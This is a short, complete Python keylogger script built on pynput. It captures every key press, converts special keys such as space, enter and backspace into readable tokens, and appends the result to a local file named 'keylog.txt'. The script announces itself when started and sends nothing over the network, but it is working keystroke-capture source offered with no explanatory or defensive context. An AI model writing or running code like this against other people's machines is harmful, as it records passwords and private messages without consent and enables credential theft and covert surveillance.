from pynput.keyboard import Listener

# Function to write keystrokes to a file
def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    # Special keys handling
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif key_data == 'Key.shift_r' or key_data == 'Key.shift':
        key_data = ''
    elif key_data == 'Key.ctrl_l' or key_data == 'Key.ctrl_r':
        key_data = ''
    elif key_data == 'Key.backspace':
        key_data = '[BACKSPACE]'
    elif key_data == 'Key.delete':
        key_data = '[DELETE]'
    elif key_data == 'Key.tab':
        key_data = '\t'
    elif key_data == 'Key.esc':
        key_data = '[ESC]'

    with open("keylog.txt", 'a') as f:
        f.write(key_data)

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

# Main function
def main():
    print("Keylogger started. Press 'Ctrl + C' to stop and exit.")
    start_keylogger()

if __name__ == "__main__":
    main()
